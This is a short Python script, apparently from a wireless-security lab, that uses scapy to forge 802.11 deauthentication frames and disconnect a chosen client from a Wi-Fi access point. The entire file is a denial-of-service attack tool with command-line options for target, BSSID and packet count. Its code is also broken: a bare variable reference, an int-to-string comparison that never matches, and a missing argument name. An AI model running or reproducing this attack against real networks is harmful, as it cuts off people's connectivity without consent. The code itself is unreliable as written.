#!/usr/bin/env python3

"""
Author: Rébecca Tevaearai, 

Created: 26th March, 2022
"""

from scapy.all import sendp        
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

from argparse import ArgumentParser as AP

def de_auth(reason_code: str, STA_mac: str, ap_mac: str, interface: str, count: int):
    """Deauthentification function with scapy

    Parameters
    __________
    reason_code: the deauthentication reason code [1, 4, 5, 8]
    STA_mac: the MAC address of the target
    ap_mac: the MAC address of the access point (BSSID)
    interface: the name of the interface that will send the packets
    count: the number of deauthentication packets to send      
    """
    dot11
    # deauth frame send from AP to STA
    if reason_code == '5' or reason_code == '4':
        dot11 = Dot11(addr1 = STA_mac, addr2 = ap_mac, addr3 = ap_mac)
    # deauth frame send from STA to AP
    elif reason_code == '8' or reason_code == '1':
        dot11 = Dot11(addr1 = ap_mac, addr2 = STA_mac, addr3 = STA_mac)

    #dot11 = Dot11(addr1 = STA_mac, addr2 = ap_mac, addr3 = ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason = reason_code)
    sendp(packet, inter = 0.1, count = count, iface = interface, verbose = 1)

if __name__ == '__main__':
    parser = AP(description = "Deauthentication script")
    parser.add_argument("-r", "--reason-code", required = True, choices = ('1', '4', '5','8'), help = "The deauthentication reason code : 1 = Unspecified, 4 = Disassociated due to inactivity, 5 = Disassociated because AP is unable to handle all currently associated stations, 8 = Deauthenticated because sending STA is leaving BSS")
    parser.add_argument("-t", "--target-mac", required = True, help = "the MAC address of the STA")
    parser.add_argument("-a", "--ap-mac", required = True, help = "The MAC address of the access point (BSSID)")
    parser.add_argument("-c", "--count", required = True, help = "the number of trame send")
    parser.add_argument("-i", "--interface", required = True, help = "the interface name")
    args = parser.parse_args()

    de_auth(int(args.reason_code), args.STA_mac, args.ap_mac, args.interface, int(args.count))